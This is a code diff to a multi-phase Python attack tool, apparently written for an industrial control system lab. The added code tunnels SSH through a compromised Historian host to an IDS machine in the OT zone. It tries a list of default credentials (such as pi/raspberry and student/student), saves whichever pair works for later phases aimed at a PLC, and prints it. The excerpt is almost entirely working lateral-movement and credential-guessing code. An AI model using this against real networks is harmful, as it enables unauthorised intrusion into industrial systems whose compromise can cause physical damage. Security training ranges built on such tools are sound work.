@@ -808,7 +808,41 @@ def phase4_ssh_pivot() -> PhaseResult:
         # to the PLC will carry a 10.20.20.5 source IP — which the PLC accepts.
         console.print("\n[bold cyan]Hopping Historian → IDS (OT zone)[/bold cyan]")
         info(f"Tunnelling SSH through Historian → {ids_user}@{ids_ip}:{ids_port}")
-        ids_client = ssh_hop(hist_client, ids_ip, ids_port, ids_user, ids_pass)
+
+        IDS_FALLBACKS = [
+            (ids_user, ids_pass),           # primary from CFG (tried first)
+            ("pi",      "raspberry"),
+            ("pi",      "admin123"),
+            ("student", "student"),
+            ("admin",   "raspberry"),
+        ]
+
+        ids_client = None
+        last_exc: Exception | None = None
+        for attempt_user, attempt_pass in IDS_FALLBACKS:
+            try:
+                info(f"Trying IDS creds: {attempt_user}@{ids_ip}")
+                ids_client = ssh_hop(hist_client, ids_ip, ids_port,
+                                     attempt_user, attempt_pass)
+                # Success — patch CFG so Phase 5 / 6 pick up the right creds
+                if attempt_user != ids_user or attempt_pass != ids_pass:
+                    CFG["ids"]["username"] = attempt_user
+                    CFG["ids"]["password"] = attempt_pass
+                    console.print(Panel(
+                        f"[bold white]Username :[/bold white] [bold yellow]{attempt_user}[/bold yellow]\n"
+                        f"[bold white]Password :[/bold white] [bold yellow]{attempt_pass}[/bold yellow]\n\n"
+                        f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
+                        title="[bold yellow] IDS Credentials Auto-Corrected [/bold yellow]",
+                        border_style="yellow",
+                        expand=False,
+                    ))
+                break   # got a live client — stop trying
+            except paramiko.AuthenticationException as exc:
+                warn(f"  Auth failed: {attempt_user}@{ids_ip}")
+                last_exc = exc
+
+        if ids_client is None:
+            raise last_exc  # bubble up so the outer except block catches it
 
         # ── Step 5: OT Fingerprinting Sweep — run FROM IDS ──────────────────
         # Source IP = 10.20.20.5 → PLC accepts the probe.
